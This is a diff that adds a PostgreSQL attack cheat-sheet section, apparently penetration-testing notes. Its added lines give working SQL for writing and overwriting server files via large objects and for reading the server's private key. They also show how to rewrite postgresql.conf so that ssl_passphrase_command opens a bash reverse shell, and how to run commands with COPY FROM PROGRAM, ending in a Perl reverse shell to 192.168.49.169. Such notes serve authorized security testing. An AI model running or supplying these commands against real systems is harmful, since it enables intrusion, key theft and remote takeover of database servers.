@@ -3178,6 +3178,81 @@ copy (select convert_from(decode('b64_encoded_payload_here','base64'),'utf-8')) 
 
 # show path to postgresql.conf
 SHOW config_file;
+
+# file write on server as db_user
+## write into large object
+SELECT lo_from_bytea(0,'data here');
+## (optional) check what has been written
+SELECT query_to_xml('SELECT * FROM pg_largeObject',true,true,'');
+SELECT query_to_xml('SELECT * FROM pg_largeObject WHERE loid=''OID_here''',true,true,'');
+## write to file
+SELECT lo_export(OID_here,'/path/to/file');
+## (optional) check file
+SELECT * from pg_read_file('/path/to/file' , 0 , 1000000);
+
+# overwrite file
+## read file into large object
+SELECT lo_import('/path/to/file');
+## export file content
+SELECT query_to_xml('SELECT * FROM pg_largeObject',true,true,'');
+## b64 decode + modify content locally
+## overwrite large object with modified data
+### overwrite entire large object
+SELECT lo_put(OID_here,0,'modified_data_here');
+### append to or replace substring within large object (will enlargen large object if necessary)
+SELECT lo_put(OID_here,start_offset_here,'data_here');
+## write to file
+SELECT lo_export(OID_here,'/path/to/file');
+
+
+# get RCE (overwrite config)
+## check current config
+### get path to config file
+SHOW config_file;
+### read config file : ssl_key_file, ssh_passphrase_command, ssh_passphrase_supports_reload
+SELECT * from pg_read_file('/path/to/config' , 0 , 1000000);
+## download private key
+### read private key into large object
+SELECT lo_import('/path/to/private/key');
+### dump private key from large object
+SELECT query_to_xml('SELECT * FROM pg_largeObject',true,true,'');
+## b64 decode key
+cat /path/to/key |base64 -d >out.key
+## add passphrase to key
+sudo openssl rsa -aes256 -in out.key -out out_with_passphrase.key
+## update config file
+### read config file into large object
+SELECT lo_import('/path/to/config/file');
+### comment out original path to private_key
+SELECT lo_put(OID_here,3959,'\x23');
+### append new content to config large object
+SELECT lo_put(OID_here,45000,'ssl_key_file = ''/path/to/writable/folder/here/key_here.key''
+ssl_passphrase_command = ''bash -i >& /dev/tcp/IP_here/port_here 0>&1''
+ssl_passphrase_command_supports_reload = on');
+### write modified config file to disk
+SELECT lo_export(OID_here,'/path/to/config/file');
+## update key
+### write new key to large object
+SELECT lo_from_bytea(0,'private_key_with_passphrase_content_here');
+### (optional) verify new content + b64 decode
+SELECT query_to_xml('SELECT * FROM pg_largeObject WHERE loid=''OID_here''',true,true,'');
+### write modified private key to disk
+SELECT lo_export(OID_here,'/path/to/writable/folder/here/key_here.key');
+## reload config
+SELECT pg_reload_conf();
+
+# get RCE
+## set up table
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+## execute command
+COPY cmd_exec FROM PROGRAM 'id';
+## print output
+SELECT * FROM cmd_exec;
+## spawn reverse shell
+COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.169:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+## when done
+DROP TABLE IF EXISTS cmd_exec;
 ```
 
 
